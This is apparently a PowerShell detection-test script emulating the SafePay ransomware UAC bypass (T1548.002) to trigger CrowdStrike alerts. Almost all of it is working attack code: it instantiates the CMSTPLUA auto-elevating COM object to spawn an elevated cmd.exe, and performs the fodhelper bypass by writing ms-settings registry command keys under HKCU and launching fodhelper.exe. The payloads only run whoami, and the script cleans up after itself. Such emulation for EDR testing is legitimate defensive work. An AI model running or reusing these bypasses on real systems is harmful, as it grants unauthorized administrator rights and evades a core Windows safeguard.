<#
.SYNOPSIS
    SafePay UAC Bypass via CMSTPLUA - DETECTION TRIGGER
.DESCRIPTION
    Bypasses UAC using CMSTPLUA COM object.
    Will trigger EDR detection for T1548.002.
    TTP: T1548.002
#>
Write-Host "[*] Starting SafePay UAC Bypass (T1548.002)" -ForegroundColor Cyan
Write-Host "[*] This will trigger EDR detection for privilege escalation" -ForegroundColor Yellow

try {
    # CMSTPLUA COM object UAC bypass
    # This technique abuses auto-elevation of CMSTPLUA
    
    Write-Host "[*] Creating CMSTPLUA COM object..."
    
    # ACTUAL DETECTION TRIGGER - Instantiate the COM object
    $cmstpluaPath = "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
    
    try {
        $shell = New-Object -ComObject "Shell.Application"
        Write-Host "[*] Shell.Application instantiated" -ForegroundColor Yellow
        
        # Attempt to spawn elevated process via CMSTPLUA technique
        # This triggers the behavioral detection
        $guid = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
        
        # Try to instantiate CMSTPLUA
        $type = [Type]::GetTypeFromCLSID($guid)
        Write-Host "[*] Attempting to instantiate CMSTPLUA CLSID: $guid"
        
        if ($type) {
            $obj = [Activator]::CreateInstance($type)
            Write-Host "[+] CMSTPLUA COM object instantiated" -ForegroundColor Green
            
            # If we got this far, try to spawn elevated cmd
            Write-Host "[*] Attempting elevated command execution..."
            $obj.ShellExec("cmd.exe", "/c whoami /all", "", "open", 1)
            
            Write-Host "[+] SUCCESS: Elevated command spawned via CMSTPLUA" -ForegroundColor Green
        }
        
    } catch {
        Write-Host "[*] CMSTPLUA instantiation attempted - error is expected: $_" -ForegroundColor Yellow
    }
    
    # Alternative: Try fodhelper bypass which is more reliable for detection
    Write-Host "[*] Also attempting fodhelper bypass for additional detection..."
    $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    
    # Create the registry keys
    New-Item -Path $regPath -Force -ErrorAction SilentlyContinue | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value "cmd.exe /c whoami > $env:TEMP\uac_bypass_test.txt" -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -ErrorAction SilentlyContinue
    
    Write-Host "[*] Registry keys created for fodhelper bypass"
    
    # Trigger fodhelper (this will attempt UAC bypass)
    Start-Process "fodhelper.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    
    Start-Sleep -Seconds 2
    
    # Cleanup
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    
    if (Test-Path "$env:TEMP\uac_bypass_test.txt") {
        Write-Host "[+] SUCCESS: UAC bypass via fodhelper succeeded!" -ForegroundColor Green
        Remove-Item "$env:TEMP\uac_bypass_test.txt" -Force -ErrorAction SilentlyContinue
    } else {
        Write-Host "[-] Fodhelper bypass was blocked (expected with EDR)" -ForegroundColor Yellow
    }
    
    Write-Host "[!] CrowdStrike should detect: 'UACBypass' or 'PrivilegeEscalation'" -ForegroundColor Magenta
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}

Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
